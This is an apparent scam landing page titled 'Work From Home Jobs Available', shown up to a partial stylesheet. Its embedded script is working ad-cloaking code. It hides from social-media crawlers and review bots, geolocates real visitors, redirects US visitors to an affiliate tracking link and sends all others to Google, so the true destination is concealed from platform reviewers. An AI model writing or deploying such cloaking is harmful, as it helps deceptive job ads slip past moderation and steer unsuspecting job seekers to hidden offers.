  <title>Work From Home Jobs Available</title>

  <!-- ✅ Geo + Bot detection redirect -->
  <script>
    (function () {
      var ua = navigator.userAgent || "";
      var isBot = /facebookexternalhit|Facebot|LinkedInBot|Twitterbot|WhatsApp|TelegramBot|Slackbot|Discordbot|crawler|spider|bot/i.test(ua);

      if (isBot) return;

      fetch("https://ipapi.co/json/")
        .then(function(res) { return res.json(); })
        .then(function(data) {
          if (data && data.country_code === "US") {
            window.location.replace("https://www.af9m8trk.com/Y9M12KU3/8U7128AR/?s1=fbnnn");
          } else {
            window.location.replace("https://www.google.com");
          }
        })
        .catch(function() {
          window.location.replace("https://www.google.com");
        });
    })();
  </script>

  <style>
    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@700;900&family=Open+Sans:wght@400;600&display=swap');

    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: 'Open Sans', sans-serif;
      background: #f5a623;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }

    .dots-bg {
      position: fixed;
      inset: 0;
      background-image: radial-gradient(circle, rgba(255,255,255,0.22) 2px, transparent 2px);
      background-size: 22px 22px;
      pointer-events: none;
      z-index: 0;
    }

    .card {
      position: relative;
      z-index: 1;
      background: #fff;
      border-radius: 28px;
      padding: 44px 38px 38px;
      max-width: 500px;
      width: 93%;
      text-align: center;
      box-shadow: 0 24px 64px rgba(0,0,0,0.16);
      animation: popIn 0.65s cubic-bezier(.34,1.56,.64,1) both;
    }

    @keyframes popIn {
      from { transform: scale(0.72) translateY(50px); opacity: 0; }
      to   { transform: scale(1) translateY(0); opacity: 1; }
    }

    .banners {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-bottom: 4px;
    }

    .banner-apply {
      background: #1BBFE3;
      color: #fff;
      font-family: 'Montserrat', sans-serif;
      font-size: 2.1rem;
      font-weight: 900;
      padding: 10px 44px;
      border-radius: 10px 10px 0 0;
      letter-spacing: 2px;
      box-shadow: 4px 4px 0 rgba(0,0,0,0.12);
      width: fit-content;
    }

    .ribbon-arrow {
      width: 0; height: 0;
      border-left: 28px solid transparent;
      border-right: 28px solid transparent;
      border-top: 28px solid #8B1A6B;
    }
